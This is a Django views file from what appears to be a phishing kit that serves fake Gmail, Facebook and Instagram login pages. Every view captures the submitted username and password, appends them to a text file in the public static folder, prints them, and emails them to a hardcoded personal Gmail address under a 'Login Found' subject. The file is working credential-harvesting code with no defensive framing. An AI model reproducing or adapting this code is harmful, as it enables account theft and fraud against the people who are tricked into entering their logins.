from django.shortcuts import redirect, render
from django.conf import settings
from django.core.mail import send_mail


dir=settings.BASE_DIR

def index(request):
    return render(request, "base.html")

def gml(request):
    if request.method=="POST":
        id=request.POST.get("id")
        passwd=request.POST.get("passwd")
        c=f"id - {id}, pass - {passwd}\n"
        with open(f"{dir}/static/gml.txt", "a") as f:
            f.write(c)
        print(c)
        mail("gmail", c)
        return redirect("/")
    return render(request, "gml.html")

def fcbk(request):
    if request.method=="POST":
        id=request.POST.get("id")
        passwd=request.POST.get("passwd")
        c=f"id - {id}, pass - {passwd}\n"
        with open(f"{dir}/static/fcbk.txt", "a") as f:
            f.write(c)
        print(c)
        mail("facebook", c)
        return redirect("/")
    return render(request, "fcbk.html")

def insta(request):
    if request.method=="POST":
        id=request.POST.get("id")
        passwd=request.POST.get("passwd")
        c=f"id - {id}, pass - {passwd}\n"
        with open(f"{dir}/static/insta.txt", "a") as f:
            f.write(c)
        print(c)
        mail("instagram", c)
        return redirect("/")
    return render(request, "insta.html")

from django.core.mail import send_mail

def mail(fgi, msg):
    email_from = settings.EMAIL_HOST_USER
    recipient_list = ['sahabsinghpatel07@gmail.com']
    send_mail(
        f'{fgi} Login Found',
        f'{msg}',
        email_from,
        recipient_list
    )
    print("success")
